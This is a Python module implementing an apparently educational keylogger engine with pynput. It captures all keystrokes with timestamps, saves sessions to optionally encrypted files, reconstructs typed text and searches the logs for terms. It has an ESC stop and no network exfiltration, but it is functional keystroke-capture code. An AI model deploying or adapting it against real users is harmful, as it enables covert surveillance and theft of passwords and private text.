"""
Core Keylogging Engine Module
Demonstrates keystroke capture techniques
"""

import json
import threading
import logging
from datetime import datetime
from pathlib import Path
from typing import Optional, Callable, List, Dict, Any
from pynput import keyboard

# Configure module-level logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class KeyloggerEngine:
    """
    Core keylogging engine with thread-safe operations.
    Captures keystrokes and stores them with timestamps in structured format.
    """
    
    def __init__(self, log_directory: str = "logs", encryption_enabled: bool = False):
        """
        Initialize the keylogger engine.
        
        Args:
            log_directory: Directory path for storing log files
            encryption_enabled: Enable encryption for stored logs (educational feature)
        """
        self.log_directory = Path(log_directory)
        self.log_directory.mkdir(exist_ok=True)
        
        self.encryption_enabled = encryption_enabled
        self.is_running = False
        self.listener = None
        self.current_session_id = None
        self.keystroke_buffer: List[Dict[str, Any]] = []
        
        # Initialize encryption if enabled
        if encryption_enabled:
            try:
                from .security import LogEncryptor
                self.encryptor = LogEncryptor()
                logger.info("Encryption module initialized successfully")
            except ImportError as e:
                logger.error(f"Failed to initialize encryption: {e}")
                self.encryption_enabled = False
        
        # Mapping for special keys to readable format
        self.special_key_mapping = {
            'Key.space': ' ',
            'Key.enter': '\n',
            'Key.tab': '\t',
            'Key.backspace': '[BACKSPACE]',
            'Key.delete': '[DELETE]',
            'Key.shift': '[SHIFT]',
            'Key.shift_r': '[SHIFT]',
            'Key.ctrl_l': '[CTRL]',
            'Key.ctrl_r': '[CTRL]',
            'Key.alt_l': '[ALT]',
            'Key.alt_r': '[ALT]',
            'Key.alt_gr': '[ALT_GR]',
            'Key.cmd': '[CMD]',
            'Key.esc': '[ESC]',
            'Key.up': '[UP]',
            'Key.down': '[DOWN]',
            'Key.left': '[LEFT]',
            'Key.right': '[RIGHT]',
            'Key.f1': '[F1]',
            'Key.f2': '[F2]',
            'Key.f3': '[F3]',
            'Key.f4': '[F4]',
            'Key.f5': '[F5]',
            'Key.f6': '[F6]',
            'Key.f7': '[F7]',
            'Key.f8': '[F8]',
            'Key.f9': '[F9]',
            'Key.f10': '[F10]',
            'Key.f11': '[F11]',
            'Key.f12': '[F12]',
        }
        
        # UI callback for real-time display
        self.on_key_pressed_callback: Optional[Callable] = None
    
    def start_logging(self) -> None:
        """
        Start the keylogging session in a background thread.
        """
        if self.is_running:
            logger.warning("Keylogger is already running")
            return
        
        self.is_running = True
        self.current_session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.keystroke_buffer = []
        
        # Start keyboard listener in daemon thread
        self.listener = keyboard.Listener(
            on_press=self._handle_key_press,
            on_release=self._handle_key_release
        )
        self.listener.daemon = True
        self.listener.start()
        
        logger.info(f"Keylogging started - Session ID: {self.current_session_id}")
    
    def stop_logging(self) -> None:
        """
        Stop the keylogging session and save captured data.
        """
        if not self.is_running:
            return
        
        self.is_running = False
        
        if self.listener and self.listener.running:
            self.listener.stop()
        
        # Save any remaining keystrokes
        self._flush_buffer_to_disk()
        
        logger.info(f"Keylogging stopped - Session ID: {self.current_session_id}")
    
    def _handle_key_press(self, key) -> None:
        """
        Handle key press events from pynput listener.
        
        Args:
            key: The pressed key object from pynput
        """
        if not self.is_running:
            return
        
        try:
            # Determine keystroke representation
            if hasattr(key, 'char') and key.char is not None:
                keystroke = key.char
                key_type = 'character'
            else:
                keystroke = self.special_key_mapping.get(str(key), f'[{key}]')
                key_type = 'special'
            
            # Create keystroke record with timestamp
            record = {
                'timestamp': datetime.now().isoformat(),
                'key': keystroke,
                'key_type': key_type,
                'raw_value': str(key)
            }
            
            # Add to buffer
            self.keystroke_buffer.append(record)
            
            # Update UI if callback is registered
            if self.on_key_pressed_callback:
                self.on_key_pressed_callback(keystroke)
            
            # Auto-save every 50 keystrokes for performance
            if len(self.keystroke_buffer) >= 50:
                self._flush_buffer_to_disk()
                
        except Exception as e:
            logger.error(f"Error processing key press: {e}")
    
    def _handle_key_release(self, key) -> None:
        """
        Handle key release events - primarily for safety ESC key.
        
        Args:
            key: The released key object
        """
        # Safety feature: Stop logging when ESC is pressed
        if key == keyboard.Key.esc and self.is_running:
            logger.info("ESC key pressed - Stopping keylogger for safety")
            self.stop_logging()
            # Returning False signals the pynput listener to stop
            return False
    
    def _flush_buffer_to_disk(self) -> None:
        """
        Save the current keystroke buffer to disk.
        """
        if not self.keystroke_buffer:
            return
        
        # Determine filename based on encryption setting
        if self.encryption_enabled:
            filename = self.log_directory / f"session_{self.current_session_id}.enc"
        else:
            filename = self.log_directory / f"session_{self.current_session_id}.json"
        
        try:
            # Prepare complete log data
            log_data = {
                'session_id': self.current_session_id,
                'start_time': self.keystroke_buffer[0]['timestamp'],
                'end_time': self.keystroke_buffer[-1]['timestamp'],
                'total_keystrokes': len(self.keystroke_buffer),
                'keystrokes': self.keystroke_buffer
            }
            
            # Convert to JSON
            json_data = json.dumps(log_data, indent=2, ensure_ascii=False)
            
            # Apply encryption if enabled
            if self.encryption_enabled and hasattr(self, 'encryptor'):
                json_data = self.encryptor.encrypt(json_data)
            
            # Write to file
            with open(filename, 'w', encoding='utf-8') as file:
                file.write(json_data)
            
            # Clear buffer after successful save
            self.keystroke_buffer = []
            
            logger.debug(f"Session data saved to {filename}")
            
        except Exception as e:
            logger.error(f"Failed to save session data: {e}")
    
    def get_log_files(self) -> List[str]:
        """
        Retrieve list of available log files.
        
        Returns:
            List of log filenames sorted by modification time (newest first)
        """
        log_files = list(self.log_directory.glob("session_*"))
        # Sort by modification time, newest first
        log_files.sort(key=lambda x: x.stat().st_mtime, reverse=True)
        return [file.name for file in log_files]
    
    def read_log_file(self, filename: str) -> Dict[str, Any]:
        """
        Read and parse a log file, decrypting if necessary.
        
        Args:
            filename: Name of the log file to read
            
        Returns:
            Dictionary containing parsed log data
            
        Raises:
            FileNotFoundError: If the log file doesn't exist
            ValueError: If the file is corrupted or improperly formatted
        """
        filepath = self.log_directory / filename
        
        if not filepath.exists():
            raise FileNotFoundError(f"Log file not found: {filename}")
        
        try:
            with open(filepath, 'r', encoding='utf-8') as file:
                content = file.read()
            
            # Decrypt if it's an encrypted file
            if filename.endswith('.enc') and self.encryption_enabled:
                content = self.encryptor.decrypt(content)
            
            return json.loads(content)
            
        except json.JSONDecodeError as e:
            logger.error(f"JSON parsing error in {filename}: {e}")
            raise ValueError(f"Corrupted log file: {filename}")
        except Exception as e:
            logger.error(f"Error reading log file {filename}: {e}")
            raise
    
    def export_log_to_text(self, filename: str, output_path: Optional[str] = None) -> str:
        """
        Export a log file to human-readable text format.
        
        Args:
            filename: Source log filename
            output_path: Optional custom output path
            
        Returns:
            Path to the exported file
        """
        log_data = self.read_log_file(filename)
        
        if output_path is None:
            output_path = str(self.log_directory / f"{log_data['session_id']}_export.txt")
        
        with open(output_path, 'w', encoding='utf-8') as file:
            # Write header
            file.write("=" * 70 + "\n")
            file.write("KEYLOGGER SIMULATION - SESSION EXPORT\n")
            file.write("=" * 70 + "\n\n")
            
            file.write(f"Session ID: {log_data['session_id']}\n")
            file.write(f"Start Time: {log_data['start_time']}\n")
            file.write(f"End Time: {log_data['end_time']}\n")
            file.write(f"Total Keystrokes: {log_data['total_keystrokes']}\n\n")
            
            # Write keystroke sequence
            file.write("=" * 70 + "\n")
            file.write("KEYSTROKE SEQUENCE (Reconstructed)\n")
            file.write("=" * 70 + "\n\n")
            
            sequence = ''.join(stroke['key'] for stroke in log_data['keystrokes'])
            file.write(sequence)
            file.write("\n\n")
            
            # Write detailed timestamp log
            file.write("=" * 70 + "\n")
            file.write("DETAILED TIMESTAMP LOG\n")
            file.write("=" * 70 + "\n\n")
            
            for stroke in log_data['keystrokes']:
                file.write(f"[{stroke['timestamp']}] {stroke['key']}\n")
        
        return output_path
    
    def search_logs(self, search_term: str, case_sensitive: bool = False) -> List[Dict[str, Any]]:
        """
        Search through all logs for a specific term.
        
        Args:
            search_term: Term to search for
            case_sensitive: Whether the search should be case sensitive
            
        Returns:
            List of matching keystroke records with session information
        """
        results = []
        search_term_lower = search_term if case_sensitive else search_term.lower()
        
        for filename in self.get_log_files():
            try:
                log_data = self.read_log_file(filename)
                session_id = log_data['session_id']
                
                for stroke in log_data['keystrokes']:
                    key = stroke['key']
                    compare_key = key if case_sensitive else key.lower()
                    
                    if search_term_lower in compare_key:
                        results.append({
                            'session_id': session_id,
                            'timestamp': stroke['timestamp'],
                            'key': stroke['key'],
                            'filename': filename
                        })
            except Exception as e:
                logger.error(f"Error searching in {filename}: {e}")
                continue
        
        return results